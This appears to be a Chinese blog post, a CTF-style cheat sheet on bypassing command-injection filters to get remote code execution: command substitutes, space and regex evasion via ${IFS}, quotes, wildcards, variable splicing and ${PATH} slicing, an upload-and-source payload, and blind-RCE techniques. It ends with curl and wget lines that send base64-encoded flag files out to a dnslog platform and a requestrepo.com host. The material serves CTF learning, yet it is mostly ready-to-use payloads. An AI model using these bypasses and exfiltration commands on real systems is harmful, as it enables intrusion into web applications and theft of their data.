+++
date = '2025-01-07T21:01:51+08:00'
draft = false
title = 'RCE绕过总结'

+++

## 常见可代替命令

cat 查看文件内容

    more:一页一页的显示档案内容
    less:与 more 类似
    head:查看头几行
    tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示
    tail:查看尾几行
    nl：显示的时候，顺便输出行号
    od:以二进制的方式读取档案内容
    vi:一种编辑器，这个也可以查看
    vim:一种编辑器，这个也可以查看
    sort:可以查看
    uniq:可以查看
    ls：查看目录
    dir：查看目录

## 空格绕过

    > < <> 重定向符
    %20(space)
    %09(tab)
    $IFS$9 
    ${IFS}（最好用这个）
    $IFS  
    %0a  换行符
    {cat,flag.txt} 在大括号中逗号可起分隔作用

## 简单符号绕过正则

### 1、单双引号法

    ca''t flag.txt
    ca""t flag.txt

因为单双引号中并没有字符，相当于在其中没有添加任何字符，命令意思不变

###  2、跨行符'\'绕过

跨行符的意思为接着上一行的内容，转到下一行接着输入命令，上下行均是一条命令

## 通配符绕过正则

通配符可以替代任何字符

    shell通配符有：
    
        * ：表示通配字符0次及以上
        ? : 表示通配字符0或

### 1、可以通配得到的命令

base64：

    /bin/base64 可以通配为：
     
    /???/????64
     
    作用为将文件以base64编码形式输出

 bzip2：

    /usr/bin/bzip2 可以通配为：
     
    /???/???/????2
     
    作用为将文件压缩成后缀为bz2的压缩文件
    flag.php ==>  flag.php.bz2

### 2、字符串通配

    flag.php ==> flag.???
                 flag*
                 ……

当然可以用通配符去通配一些命令，但不能全名称通配

    例如：
    /bin/ca?
    相当于cat命令

## 变量拼接绕过正则

可以在shell语句里定义变量，将被过滤的字符串分成部分绕过

    以flag.php为例:
     
    x=lag;cat f$x.php
     
    相当于:
     
    cat flag.php

## 内联执行

内联执行就是在一条shell语句中内嵌子shell语句,用主shell语句处理子语句的结果

可用于内联语句的符号you ${},``（反引号）

例如:

    echo `ls`
     
    echo ${ls}
     
    相当于把ls的结果使用echo输出

## "${}"截取环境变量拼接

例子

    ${PATH:14:1}${PATH:5:1} flag.txt
     
    在此环境中相当于 nl flag.txt

## []中括号匹配绕过

例如[a-c] 代表匹配 a-b之间的字符,包括a,b字符本身

匹配范围为当前目录

例子

    /[a-c][h-j][m-o]/[b-d]a[s-u] flag.txt
     
    相当于
    /bin/cat flag.txt
     
    因为[]匹配范围只在当前路径
    所以要为bin绝对路径

## source命令

source命令，又称点命令,可以用点号( . ),代替

该命令可以读取并执行文件中的命令

可构建文件上传表单，上传命令文件执行

表单为：

    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>POST数据包POC</title>
    </head>
    <body>
    <form action="http://46230c96-8291-44b8-a58c-c133ec248231.chall.ctf.show/" method="post" enctype="multipart/form-data">
    <!--链接是当前打开的题目链接-->
        <label for="file">文件名：</label>
        <input type="file" name="file" id="file"><br>
        <input type="submit" name="submit" value="提交">
    </form>
    </body>
    </html>

get请求为

    ?c=.+/???/????????[@-[]
     
    一般来说这个文件在linux下面保存在/tmp/php??????一般后面的6个字符是随机生成的有大小写。（可以通过linux的匹配符去匹配）

注意：通过.去执行sh命令不需要有执行权限

## 无回显rce

无回显的执行函数：

exec()

shell_exec()

`` （反引号）

这些需要php函数echo才可以输出结果

### 1、复制到可访问文件

tee命令：

tee 命令可用于创建或追加写入文件

可配合cat等打开文件命令和管道符将flag写入到规定文件中

例如

    先将根目录复制到某个文件，然后访问查看
    ls /| tee ls.txt
     
    然后输入 url/1.txt  即可查看根目录
    
    再复制flag文件，然后访问查看
    cat /flag.php | tee flag.txt
     
    然后输入 url/falg.txt  即可查看根目录
    
    还可以使用其他的复制方法
    copy /flag.php flag.txt
     
    mv /flag.php flag.txt

### 2、dnslog外带数据法

需要dnslog平台，可自己搭建

    curl dnslog平台url/`cat flag.php|base64`
    wget dnslog平台url/`cat flag.php|base64`

### 3、http外带数据法

```
用http通道带出数据
?cmd=curl%20http://6ms8e9yi.requestrepo.com/?1=`cat%20f*|%20base64`
```

### 4.反弹shell法
